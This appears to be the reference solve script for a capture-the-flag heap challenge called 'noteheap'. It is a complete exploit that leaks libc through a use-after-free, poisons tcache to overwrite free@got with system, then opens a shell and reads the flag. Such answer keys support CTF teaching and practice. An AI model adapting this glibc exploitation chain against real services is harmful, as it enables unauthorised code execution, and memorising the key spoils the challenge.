#!/usr/bin/env python3
"""noteheap 参考解：UAF → unsorted bin 泄 libc → tcache poisoning → free@got = system。

用法：python3 solve.py [host port]   （不带参数则在本地跑 ./dist/noteheap）
"""
import os
import socket
import struct
import subprocess
import sys
import time

LIBC_UNSORTED_OFF = 0x204B20
OFF_SYSTEM = 0x58750
OFF_PUTS = 0x87CC0
FREE_GOT = 0x404000
PUTS_GOT = 0x404008


def p64(x):
    return struct.pack("<Q", x)


def u64(b):
    return struct.unpack("<Q", b[:8])[0]


class Conn:
    def __init__(self, host=None, port=None):
        if host:
            self.s = socket.create_connection((host, port), timeout=15)
        else:
            path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dist", "noteheap")
            self.p = subprocess.Popen([path], stdin=subprocess.PIPE,
                                      stdout=subprocess.PIPE, bufsize=0)
            self.s = None

    def _read(self, n=4096):
        return self.s.recv(n) if self.s else os.read(self.p.stdout.fileno(), n)

    def recv_until(self, marker, timeout=10):
        buf = b""
        end = time.time() + timeout
        while marker not in buf and time.time() < end:
            try:
                chunk = self._read()
            except OSError:
                break
            if not chunk:
                break
            buf += chunk
        return buf

    def recv_n(self, n, timeout=10):
        buf = b""
        end = time.time() + timeout
        while len(buf) < n and time.time() < end:
            try:
                chunk = self._read(n - len(buf))
            except OSError:
                break
            if not chunk:
                break
            buf += chunk
        return buf

    def send(self, data):
        if self.s:
            self.s.sendall(data)
        else:
            self.p.stdin.write(data)
            self.p.stdin.flush()

    def close(self):
        if self.s:
            self.s.close()
        else:
            self.p.kill()


def main():
    host = sys.argv[1] if len(sys.argv) > 2 else None
    port = int(sys.argv[2]) if len(sys.argv) > 2 else None
    c = Conn(host, port)
    c.recv_until(b"> ")

    def add(i, size, data):
        c.send(b"1\n"); c.recv_until(b"idx> "); c.send(f"{i}\n".encode())
        c.recv_until(b"size> "); c.send(f"{size}\n".encode())
        c.recv_until(b"data> "); c.send(data); c.recv_until(b"> ")

    def dele(i):
        c.send(b"2\n"); c.recv_until(b"idx> "); c.send(f"{i}\n".encode()); c.recv_until(b"> ")

    def edit(i, data):
        c.send(b"3\n"); c.recv_until(b"idx> "); c.send(f"{i}\n".encode())
        c.recv_until(b"data> "); c.send(data); c.recv_until(b"> ")

    def show(i, n):
        c.send(b"4\n"); c.recv_until(b"idx> "); c.send(f"{i}\n".encode())
        return c.recv_n(n)

    # 1) unsorted bin 泄 libc
    add(0, 0x500, b"A" * 0x500)
    add(1, 0x20, b"B" * 0x20)
    add(2, 0x20, b"C" * 0x20)
    dele(0)
    leak = u64(show(0, 0x500))
    libc = leak - LIBC_UNSORTED_OFF
    print(f"[+] libc base = {hex(libc)}")

    # 2) 两个 0x20 chunk 都进 tcache（count=2），tail 的 next 为 NULL
    #    -> 读到 tail 的 fd 就是它自己的 userptr>>12，用于绕过 safe-linking
    dele(1)
    dele(2)
    enc = u64(show(1, 0x20))
    print(f"[+] page key  = {hex(enc)}")

    # 3) tcache poisoning：head(chunk2) 的 next 指向 free@got
    edit(2, p64(enc ^ FREE_GOT) + b"P" * 24)
    add(3, 0x20, b"X" * 0x20)                          # 吃掉 chunk2（count 2->1）
    system = libc + OFF_SYSTEM
    # glibc>=2.35 的 tcache_get 会写 e->key=0（落在 puts@got），顺手写回
    add(4, 0x20, p64(system) + p64(libc + OFF_PUTS))   # count 1->0，返回 free@got
    print(f"[+] free@got -> system({hex(system)})")

    # 4) free("/bin/sh") => system("/bin/sh")
    add(5, 0x20, b"/bin/sh\x00")
    c.send(b"2\n"); c.recv_until(b"idx> "); c.send(b"5\n")
    time.sleep(0.4)
    c.send(b"echo PWNED; cat /flag 2>/dev/null; cat flag.txt 2>/dev/null; id\n")
    time.sleep(0.8)
    out = b""
    try:
        out = c._read(65536)
    except OSError:
        pass
    print("[+] 输出:", out.decode("utf-8", "replace")[:2000])
    ok = b"PWNED" in out or b"uid=" in out
    print("[+] 利用", "成功" if ok else "失败")
    c.close()
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
